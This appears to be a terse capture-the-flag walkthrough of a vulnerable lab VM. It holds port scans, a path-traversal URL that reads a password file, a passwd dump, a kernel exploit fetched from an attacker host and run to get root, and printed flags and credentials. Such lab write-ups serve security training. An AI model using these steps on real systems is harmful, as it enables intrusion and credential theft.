@@ -1,0 +1,172 @@
+hack@kali:~$ nmap -A -p- 192.168.1.33
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-11 17:05 CET
+Nmap scan report for ubuntu.homenet.telecomitalia.it (192.168.1.33)
+Host is up (0.00067s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 (RSA)
+|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)
+|_  256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: HacknPentest
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.70 seconds
+
+
+With dirb found /dev
+hack@kali:~/CTF/OSCP/Prime_Series_Level-1$ wget http://192.168.1.33/dev
+--2020-03-11 17:36:09--  http://192.168.1.33/dev
+Connessione a 192.168.1.33:80...connesso.
+Richiesta HTTP inviata, in attesa di risposta... 200 OK
+Lunghezza: 131
+Salvataggio in: "dev"
+
+dev                      100%[=================================>]     131  --.-KB/s    in 0s      
+                                                                                                   
+2020-03-11 17:36:09 (17,0 MB/s) - "dev" salvato [131/131]                                          
+                                                                                                   
+hack@kali:~/CTF/OSCP/Prime_Series_Level-1$ cat dev                                                 
+hello,                                                                                             
+                                                                                                   
+now you are at level 0 stage.                                                                      
+                                                                                                   
+In real life pentesting we should use our tools to dig on a web very hard.                         
+                                                                                                   
+Happy hacking.   
+
+
+Using wpscan:
+
+[i] User(s) Identified:
+
+[+] victor
+ | Found By: Author Posts - Display Name (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+
+
+ Do something better
+
+
+
+
+
+ok well Now you reah at the exact parameter
+
+Now dig some more for next one
+use 'secrettier360' parameter on some other php page for more fun. 
+
+
+
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false messagebus:x:106:110::/var/run/dbus:/bin/false uuidd:x:107:111::/run/uuidd:/bin/false lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false whoopsie:x:109:117::/nonexistent:/bin/false avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false saned:x:119:127::/var/lib/saned:/bin/false usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false victor:x:1000:1000:victor,,,:/home/victor:/bin/bash mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false saket:x:1001:1001:find password.txt file in my directory:/home/saket: sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin 
+
+
+http://192.168.1.34/image.php?secrettier360=../../../home/saket/password.txt
+follow_the_ippsec 
+
+
+$ cat user.txt
+af3c658dcf9d7190da3153519c003456
+$ 
+
+
+www-data@ubuntu:/tmp$ 
+www-data@ubuntu:/tmp$ wget 192.168.1.28:8888/45010.c
+--2020-03-11 13:47:48--  http://192.168.1.28:8888/45010.c
+Connecting to 192.168.1.28:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 13728 (13K) [text/plain]
+Saving to: '45010.c'
+
+45010.c             100%[===================>]  13.41K  --.-KB/s    in 0s      
+
+2020-03-11 13:47:48 (276 MB/s) - '45010.c' saved [13728/13728]
+
+www-data@ubuntu:/tmp$ 
+www-data@ubuntu:/tmp$ ls
+45010.c
+VMwareDnD
+systemd-private-f7f380a461274f09bce684d52c68feb1-colord.service-ILvPoR
+systemd-private-f7f380a461274f09bce684d52c68feb1-rtkit-daemon.service-IIYp5z
+systemd-private-f7f380a461274f09bce684d52c68feb1-systemd-timesyncd.service-cZL0XW
+vmware-root
+www-data@ubuntu:/tmp$ ls -la
+total 68
+drwxrwxrwt 12 root     root      4096 Mar 11 13:47 .
+drwxr-xr-x 24 root     root      4096 Aug 29  2019 ..
+drwxrwxrwt  2 root     root      4096 Mar 11 13:01 .ICE-unix
+drwxrwxrwt  2 root     root      4096 Mar 11 13:01 .Test-unix
+-r--r--r--  1 root     root        11 Mar 11 13:01 .X0-lock
+drwxrwxrwt  2 root     root      4096 Mar 11 13:01 .X11-unix
+drwxrwxrwt  2 root     root      4096 Mar 11 13:01 .XIM-unix
+drwxrwxrwt  2 root     root      4096 Mar 11 13:01 .font-unix
+-rw-rw-rw-  1 www-data www-data 13728 Mar 11 13:46 45010.c
+drwxrwxrwt  2 root     root      4096 Mar 11 13:01 VMwareDnD
+drwx------  3 root     root      4096 Mar 11 13:01 systemd-private-f7f380a461274f09bce684d52c68feb1-colord.service-ILvPoR
+drwx------  3 root     root      4096 Mar 11 13:01 systemd-private-f7f380a461274f09bce684d52c68feb1-rtkit-daemon.service-IIYp5z
+drwx------  3 root     root      4096 Mar 11 13:01 systemd-private-f7f380a461274f09bce684d52c68feb1-systemd-timesyncd.service-cZL0XW
+drwx------  2 root     root      4096 Mar 11 13:01 vmware-root
+www-data@ubuntu:/tmp$ 
+www-data@ubuntu:/tmp$ gcc 45010.c
+www-data@ubuntu:/tmp$ ls
+45010.c
+VMwareDnD
+a.out
+systemd-private-f7f380a461274f09bce684d52c68feb1-colord.service-ILvPoR
+systemd-private-f7f380a461274f09bce684d52c68feb1-rtkit-daemon.service-IIYp5z
+systemd-private-f7f380a461274f09bce684d52c68feb1-systemd-timesyncd.service-cZL0XW
+vmware-root
+www-data@ubuntu:/tmp$ ./a.out
+[.] 
+[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
+[.] 
+[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
+[.] 
+[*] creating bpf map
+[*] sneaking evil bpf past the verifier
+[*] creating socketpair()
+[*] attaching bpf backdoor to socket
+[*] skbuff => ffff93df38d99b00
+[*] Leaking sock struct from ffff93df36552400
+[*] Sock->sk_rcvtimeo at offset 592
+[*] Cred structure at ffff93df30cbb440
+[*] UID from cred structure: 33, matches the current: 33
+[*] hammering cred structure at ffff93df30cbb440
+[*] credentials patched, launching shell...
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+# cd /root
+# ls
+enc  enc.cpp  enc.txt  key.txt  root.txt  sql.py  t.sh  wfuzz  wordpress.sql
+# cat root.txt
+b2b17036da1de94cfb024540a8e7075a
+# cat key.txt
+I know you are the fan of ippsec.
+
+So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.
+# 
+# cat t.sh
+service apache2 start;
+service ssh start;
+service mysql start;
+ip1=$(hostname -I);
+echo $ip1;
+ip="${ip1::-1}";
+command_site="use wordpress;UPDATE wp_options SET option_value='http://$ip/wordpress' where option_name='siteurl';";
+command_url="use wordpress;UPDATE wp_options SET option_value='http://$ip/wordpress' where option_name='home';";
+echo $command_home;
+mysql -u root -proot -e "$command_site";
+mysql -u root -proot -e "$command_url";
+# 
+# cat enc.txt
+nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=
+# 
+
